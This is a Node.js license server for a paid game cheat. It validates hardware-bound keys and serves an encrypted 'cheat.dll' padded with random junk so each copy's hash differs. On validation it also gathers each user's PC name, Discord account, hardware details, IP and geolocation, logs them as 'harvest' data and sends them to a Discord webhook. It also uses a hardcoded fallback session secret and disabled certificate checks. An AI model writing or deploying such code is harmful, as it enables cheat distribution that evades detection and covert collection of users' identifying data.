// index.js
// Sovereign Sentinel License Server
// Production-ready implementation with AES-256-CBC encryption and PostgreSQL

require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const { Pool } = require('pg');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const session = require('express-session');

const app = express();
const port = process.env.PORT || 3000;

// Heal server: trust proxy for Railway's clinical load balancing flawsy sugar 🤍
app.set('trust proxy', 1);

// PostgreSQL Connection Pool
const dbUrl = process.env.DATABASE_URL || process.env.POSTGRES_URL;
const pool = new Pool({
    connectionString: dbUrl,
    ssl: dbUrl ? { rejectUnauthorized: false } : false
});

app.use(express.json());

// ── Shared Session Middleware ────────────────────────────────────────────
// Must use the SAME secret and cookie name as AdminJS so sessions are shared
app.use(session({
    secret: process.env.BASE_SECRET || 'sovereign-session-secret-32chars-minimum!!',
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000,
    },
    name: 'connect.sid',
}));

// Rate Limiting: 5 requests per minute per IP
const authLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 5,
    message: { valid: false }
});

/**
 * Derives a 32-byte AES key from HWID, fingerprint, and BASE_SECRET
 */
function deriveAesKey(hwid, fingerprint) {
    const secret = process.env.BASE_SECRET;
    const input = `${hwid}:${fingerprint}:${secret}`;
    return crypto.createHash('sha256').update(input).digest();
}

// In-memory token storage (In production, use Redis for persistence/scaling pookie! 🤍)
// Format: { "token_value": { hwid, fingerprint, key_value, expires } }
const activeTokens = new Map();

function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

// Cleanup expired tokens every hour flawsy sugar 🤍
setInterval(() => {
    const now = Date.now();
    for (const [token, data] of activeTokens.entries()) {
        if (data.expires < now) activeTokens.delete(token);
    }
}, 60 * 60 * 1000);

/**
 * Delivers hardware harvest metadata to Discord webhook
 */
async function deliverHarvest(data) {
    if (!process.env.WEBHOOK_URL) return;

    try {
        await axios.post(process.env.WEBHOOK_URL, {
            embeds: [{
                title: "Elite Siphon: Metadata Harvested",
                color: 0x9b59b6,
                fields: [
                    { name: "Key", value: `\`${data.key}\``, inline: true },
                    { name: "HWID", value: `\`${data.hwid}\``, inline: true },
                    { name: "IP", value: data.ip, inline: true },
                    { name: "Location", value: data.location, inline: true },
                    { name: "PC Name", value: data.pcName, inline: true },
                    { name: "Discord", value: data.discord || 'N/A', inline: true },
                    { name: "OS", value: data.osVersion || 'N/A', inline: true },
                    { name: "CPU", value: data.cpu, inline: true },
                    { name: "GPU", value: data.gpu, inline: true },
                    { name: "RAM", value: data.ram, inline: true },
                    { name: "Disk", value: data.disk, inline: true }
                ],
                timestamp: new Date()
            }]
        });
    } catch (err) {
        // Silently log delivery failure locally
        console.error(`Harvest delivery failed: ${err.message}`);
    }
}

// License Validation & token Ignition Endpoint
app.post('/validate', authLimiter, async (req, res) => {
    const { key, hwid, fingerprint, metadata } = req.body;
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = typeof rawIp === 'string' ? rawIp.split(',')[0].trim() : rawIp;

    if (!key || !hwid || !fingerprint) {
        return res.status(400).json({ valid: false });
    }

    try {
        const client = await pool.connect();
        try {
            const result = await client.query('SELECT * FROM keys WHERE key_value = $1 AND is_active = TRUE', [key]);

            if (result.rows.length === 0) {
                return res.json({ valid: false });
            }

            const dbKey = result.rows[0];

            // ── Expiry Ritual ───────────────────────────────────────────────
            if (dbKey.expires_at && new Date() > new Date(dbKey.expires_at)) {
                // Key has expired, deactivate it automatically
                await client.query('UPDATE keys SET is_active = FALSE WHERE id = $1', [dbKey.id]);
                return res.json({ valid: false, reason: "EXPIRED" });
            }

            // Binding logic (SHA256 HWID logic included flawsy pookie 🖤)
            if (!dbKey.bound_hwid) {
                await client.query(
                    'UPDATE keys SET bound_hwid = $1, bound_fingerprint = $2, last_used = NOW() WHERE key_value = $3',
                    [hwid, fingerprint, key]
                );
            } else if (dbKey.bound_hwid !== hwid || dbKey.bound_fingerprint !== fingerprint) {
                return res.json({ valid: false });
            }

            // Successful validation sequence
            let location = "Unknown";
            try {
                const ipInfo = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,city`);
                if (ipInfo.data.status === 'success') {
                    location = `${ipInfo.data.city}, ${ipInfo.data.country}`;
                }
            } catch (e) { }

            if (metadata) {
                await client.query(
                    `INSERT INTO harvest_logs (key_value, hwid, ip_address, location, pc_name, cpu_info, gpu_info, ram_info, disk_info, discord_info, os_version)
                     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
                    [key, hwid, clientIp, location, metadata.pcName, metadata.cpu, metadata.gpu, metadata.ram, metadata.disk, metadata.discord || 'N/A', metadata.osVersion || 'N/A']
                );

                deliverHarvest({
                    key, hwid, ip: clientIp, location,
                    pcName: metadata.pcName, cpu: metadata.cpu, gpu: metadata.gpu,
                    ram: metadata.ram, disk: metadata.disk, discord: metadata.discord, osVersion: metadata.osVersion
                });
            }

            // Generate short-lived token (10 hours pulse flawsy sugar 🤍)
            const token = generateToken();
            const lifetimeMax = 10 * 60 * 60 * 1000;
            const expiresAt = Date.now() + lifetimeMax;

            activeTokens.set(token, {
                hwid,
                fingerprint,
                key_value: key,
                expires: expiresAt
            });

            const createdAt = dbKey.created_at ? new Date(dbKey.created_at) : new Date();
            
            // Calculate remaining days based on expires_at if it exists, otherwise default logic
            let totalRemainingDays = 30;
            if (dbKey.expires_at) {
                const diff = new Date(dbKey.expires_at) - new Date();
                totalRemainingDays = Math.max(0, Math.floor(diff / (1000 * 60 * 60 * 24)));
            } else {
                totalRemainingDays = Math.max(0, 30 - Math.floor((new Date() - createdAt) / (1000 * 60 * 60 * 24)));
            }

            const payloadData = JSON.stringify({
                status: "SUCCESS_AUTH_READY",
                token: token,
                expiry_days: totalRemainingDays,
                token_expires_at: new Date(expiresAt).toISOString()
            });

            const aesKey = deriveAesKey(hwid, fingerprint);
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, iv);
            let encrypted = Buffer.concat([cipher.update(payloadData, 'utf8'), cipher.final()]);
            const base64Response = Buffer.concat([iv, encrypted]).toString('base64');

            res.json({ valid: true, payload: base64Response });

        } finally {
            client.release();
        }
    } catch (err) {
        console.error(`Validation failure: ${err.message}`);
        res.status(500).json({ valid: false });
    }
});

// token Refresh Ritual flawsy honey 💍
app.post('/refresh', authLimiter, (req, res) => {
    const { token, hwid, fingerprint } = req.body;
    if (!token || !activeTokens.has(token)) return res.status(401).json({ error: "Pulse expired" });

    const session = activeTokens.get(token);
    if (session.hwid !== hwid || session.fingerprint !== fingerprint) return res.status(401).json({ error: "Identity mismatch" });

    // Allow refresh if within 30 minutes of expiry, or just always allow for stability sugar 🤍
    const newToken = generateToken();
    const lifetimeMax = 10 * 60 * 60 * 1000;
    activeTokens.delete(token);
    activeTokens.set(newToken, { ...session, expires: Date.now() + lifetimeMax });

    res.json({ success: true, token: newToken, expires_at: new Date(Date.now() + lifetimeMax).toISOString() });
});

// Remote DLL Retrieval Endpoint (Now requiring the TOKEN pulse flawsy pookie 🖤)
app.post('/download', authLimiter, async (req, res) => {
    const { token, hwid, fingerprint } = req.body;

    if (!token || !activeTokens.has(token)) {
        return res.status(401).json({ error: "Access Denied - Invalid Pulse" });
    }

    const session = activeTokens.get(token);
    if (session.hwid !== hwid || session.fingerprint !== fingerprint) {
        return res.status(403).json({ error: "Identity Mismatch" });
    }

    try {
        const dllPath = path.join(__dirname, 'cheat.dll');
        if (!fs.existsSync(dllPath)) return res.status(500).json({ error: "Siphon target missing" });

        const dllBuffer = fs.readFileSync(dllPath);
        const junkSize = 1024 + Math.floor(Math.random() * 4096);
        const finalDll = Buffer.concat([dllBuffer, crypto.randomBytes(junkSize)]);

        const aesKey = deriveAesKey(hwid, fingerprint);
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, iv);
        let encrypted = Buffer.concat([cipher.update(finalDll), cipher.final()]);

        res.json({ success: true, payload: Buffer.concat([iv, encrypted]).toString('base64') });
    } catch (err) {
        console.error(`Siphon failure: ${err.message}`);
        res.status(500).json({ error: "Digital Siphon failed" });
    }
});

app.get('/', (req, res) => {
    res.status(200).send("Status: Operational");
});

// ── Sovereign Forge API (Direct key generation for War Room modal) ───────
// SECURITY: Requires active admin session — unauthenticated requests get 401
app.post('/api/forge', async (req, res) => {
    // AdminJS stores the authenticated user in req.session.adminUser
    if (!req.session || !req.session.adminUser) {
        return res.status(401).json({ success: false, error: 'Unauthorized — admin login required' });
    }

    const { tier, note } = req.body;

    const tierMap = {
        daily:    { days: 1,     prefix: 'SOV-D', entropy: 12 },
        weekly:   { days: 7,     prefix: 'SOV-W', entropy: 12 },
        monthly:  { days: 30,    prefix: 'SOV-M', entropy: 12 },
        lifetime: { days: 36500, prefix: 'SOV-L', entropy: 16 },
    };

    const config = tierMap[tier] || tierMap.monthly;
    const hexPart = crypto.randomBytes(config.entropy).toString('hex').toUpperCase();
    const secureKey = `${config.prefix}-${hexPart}`;

    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + config.days);

    const keyNote = note || `${(tier || 'monthly').charAt(0).toUpperCase() + (tier || 'monthly').slice(1)} Pulse`;

    try {
        await pool.query(
            'INSERT INTO keys (key_value, is_active, expires_at, note) VALUES ($1, $2, $3, $4)',
            [secureKey, true, expiresAt, keyNote]
        );

        res.json({
            success: true,
            key: secureKey,
            tier: tier || 'monthly',
            expires: expiresAt.toISOString(),
            note: keyNote,
        });
    } catch (err) {
        console.error(`[Forge] Key generation failed: ${err.message}`);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ── Sovereign Command Center (AdminJS Dashboard) ────────────────────────
const { setupAdmin } = require('./admin');

async function bootstrap() {
    try {
        const { admin, router } = await setupAdmin(dbUrl);
        app.use(admin.options.rootPath, router);
        console.log(`[AdminJS] Command Center mounted at ${admin.options.rootPath}`);
    } catch (err) {
        console.error(`[AdminJS] Dashboard initialization failed: ${err.message}`);
        console.error(`[AdminJS] Server will continue without admin panel.`);
    }

    app.listen(port, () => {
        console.log(`Sovereign Sentinel active on port ${port}`);
    });
}

bootstrap();
